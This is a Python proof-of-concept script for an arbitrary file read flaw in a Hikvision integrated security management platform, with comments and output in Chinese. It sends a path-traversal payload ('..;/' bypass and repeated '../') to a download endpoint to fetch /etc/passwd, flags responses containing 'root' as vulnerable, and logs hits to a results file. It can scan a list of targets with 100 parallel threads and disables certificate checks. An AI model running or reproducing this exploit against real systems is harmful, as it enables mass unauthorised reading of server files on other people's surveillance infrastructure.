import requests
import argparse
import sys
import time
import re
import warnings
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore")


def banner():
    pass

def main():
    # 处理命令行参数
    parser = argparse.ArgumentParser(description="海康威视综合安防 download 任意文件读取漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 判断参数类型，并调用相应的函数处理
    if args.url and not args.file:
        poc(args.url)
        	
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd'
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }

    try:
        res1 = requests.get(url=target+url_payload, headers=header,verify=False)
        if res1.status_code == 200 and "root" in res1.text:
            print(f"[+]该url{target}存在任意文件读取漏洞")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
        else:
            print(f'[-]该url{target}不存在任意文件读取漏洞')

    except Exception as e:
        print(f'[*]该网站{target}可能存在问题，请手工测试')


if __name__ == '__main__':
    main()
